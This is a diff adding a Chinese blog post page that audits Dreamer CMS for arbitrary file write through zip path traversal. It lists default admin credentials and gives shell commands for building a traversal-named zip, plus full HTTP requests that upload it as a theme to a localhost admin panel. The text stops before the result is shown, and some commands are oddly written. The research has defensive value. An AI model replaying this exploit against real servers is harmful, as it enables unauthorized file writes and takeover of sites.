@@ -1,0 +1,756 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [代码审计]dreamer_cms任意文件写入 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="环境搭建 kxiangtian&#x2F;dreamer_cms: Dreamer CMS 梦想家内容发布系统是国内首款java开发的内容发布系统，采用最流行的springboot+thymeleaf框架搭建，灵活小巧，配置简单。 CMS包括两个部分（代码部分、资源部分）代码不多说。资源就是图片、模版等，该目录在application.yml中web.upload-path配置项目中配置。  克隆项目到本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[代码审计]dreamer_cms任意文件写入">
+<meta property="og:url" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="环境搭建 kxiangtian&#x2F;dreamer_cms: Dreamer CMS 梦想家内容发布系统是国内首款java开发的内容发布系统，采用最流行的springboot+thymeleaf框架搭建，灵活小巧，配置简单。 CMS包括两个部分（代码部分、资源部分）代码不多说。资源就是图片、模版等，该目录在application.yml中web.upload-path配置项目中配置。  克隆项目到本">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155036168.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155049271.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155150762.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155159855.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155319131.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203531731.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203810951.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203825281.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203833755.png">
+<meta property="og:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405203847638.png">
+<meta property="article:published_time" content="2026-04-05T07:09:05.000Z">
+<meta property="article:modified_time" content="2026-04-09T11:50:52.837Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/04/05/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]dreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155036168.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[代码审计]dreamer_cms任意文件写入">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[代码审计]dreamer_cms任意文件写入</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text"> 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip-%E5%8E%8B%E7%BC%A9%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text"> zip 压缩的漏洞点原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text"> 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text"> 漏洞分析</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[代码审计]dreamer_cms任意文件写入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/04/05/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-04-05T07:09:05.000Z" itemprop="datePublished">2026-04-05</time>
+    <time style="display: none;" id="post-update-time">2026-04-09</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-aos="zoom-in">代码审计</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2>
+<p><a target="_blank" rel="noopener" href="https://github.com/kxiangtian/dreamer_cms">kxiangtian/dreamer_cms: Dreamer CMS 梦想家内容发布系统是国内首款java开发的内容发布系统，采用最流行的springboot+thymeleaf框架搭建，灵活小巧，配置简单。</a></p>
+<p>CMS包括两个部分（代码部分、资源部分）代码不多说。资源就是图片、模版等，该目录在application.yml中web.upload-path配置项目中配置。</p>
+<ol>
+<li>克隆项目到本地工作空间</li>
+<li>导入Eclipse或Sts等开发工具（推荐使用Spring Tools Suite 4）（项目中缺少的google/kaptcha.jar在附件中，大家自行下载）</li>
+<li>项目需要Redis，请自行修改application.yml中Redis配置</li>
+<li>修改项目资源目录，application.yml文件web.upload-path配置项（如D:/dreamer-cms/）</li>
+<li>将项目src/main/resources/db/dreamer-cms.zip文件解析，保证解压后的目录路径和名称和资源目录一致</li>
+<li>运行项目DreamerBlogApplication.java</li>
+<li>网站首页：<a target="_blank" rel="noopener" href="http://localhost:8888/">http://localhost:8888</a> 项目管理后台：<a target="_blank" rel="noopener" href="http://localhost:8888/admin">http://localhost:8888/admin</a></li>
+<li>管理后台用户名：wangjn；密码：123456</li>
+<li>模版标签开发教程请参考：<a target="_blank" rel="noopener" href="http://doc.itechyou.cn/">http://doc.itechyou.cn</a></li>
+</ol>
+<h2 id="zip-压缩的漏洞点原理"><a class="markdownIt-Anchor" href="#zip-压缩的漏洞点原理"></a> zip 压缩的漏洞点原理</h2>
+<p>例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip -r ./a.zip ..\*..\*a</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">zip -r ./a.zip ：将指定内容递归压缩到 a.zip 文件中。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">..\*..\*a			：这是一个路径模式，.. 表示上级目录，* 是通配符，a 是文件名的一部分。</span></span><br></pre></td></tr></table></figure>
+<p>漏洞原因：解压的时候可能没有验证<code>../</code>或者导致被绕过，就可能<strong>导致我们的目录穿越</strong>，压缩我们的文件到任意目录导致危险的利用</p>
+<h2 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现"></a> 漏洞复现</h2>
+<p>先创建一个文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch ..\*..\*a  </span><br><span class="line">zip -r ..\*..\*a </span><br><span class="line">zip -r ./a.zip ..\*..\*a</span><br></pre></td></tr></table></figure>
+<p>然后我们来到 cms 的漏洞点</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155036168.png" alt="image-20260405155036168" /></p>
+<p>这里可以上传主题</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155049271.png" alt="image-20260405155049271" /></p>
+<p>上传我们的 zip 文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload/uploadFile</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7897</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>925</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryckqhdU0rzrhXfdGL</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:7897</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:7897/admin/theme</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>MAIN_MENU_COLLAPSE=false; DG_USER_ID_ANONYMOUS=e5dbe5efa486485aa7d6260b97b1fe1d; PUBLICCMS_ADMIN=1_6c1a761a-4f04-4c9a-85b9-b23cfd4a95fb; bjui_theme=blue; dreamer-cms-s=b9e08600-7c70-4e0a-bb33-69e3dede3cdb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryckqhdU0rzrhXfdGL</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;id&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">WU_FILE_0</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryckqhdU0rzrhXfdGL</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;name&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">a.zip</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryckqhdU0rzrhXfdGL</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;type&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">application/x-zip-compressed</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryckqhdU0rzrhXfdGL</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;lastModifiedDate&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Tue Feb <span class="number">25</span> <span class="number">2025</span> <span class="number">01</span>:<span class="number">04</span>:<span class="number">50</span> GMT+<span class="number">0800</span> (ä¸­å½æ åæ¶é´)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryckqhdU0rzrhXfdGL</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;size&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">164</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryckqhdU0rzrhXfdGL</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;a.zip&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/x-zip-compressed</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">xxx</span></span><br></pre></td></tr></table></figure>
+<p>然后点击确定</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/theme/add</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7897</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:7897</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>iframe</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:7897/admin/theme</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>MAIN_MENU_COLLAPSE=false; DG_USER_ID_ANONYMOUS=e5dbe5efa486485aa7d6260b97b1fe1d; PUBLICCMS_ADMIN=1_6c1a761a-4f04-4c9a-85b9-b23cfd4a95fb; bjui_theme=blue; dreamer-cms-s=b9e08600-7c70-4e0a-bb33-69e3dede3cdb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">themePath</span>=<span class="number">20250225</span>%<span class="number">2</span>F33505ebce54d4b01b62e421314ff66cb.zip&amp;file=</span></span><br></pre></td></tr></table></figure>
+<p>我们根据穿越的点观察</p>
+<p>原目录</p>
+<p><img src="%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Ddreamer_cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.assets/image-20260405155150762.png" alt="image-20260405155150762" /></p>
+<p>解压后创建的文件</p>
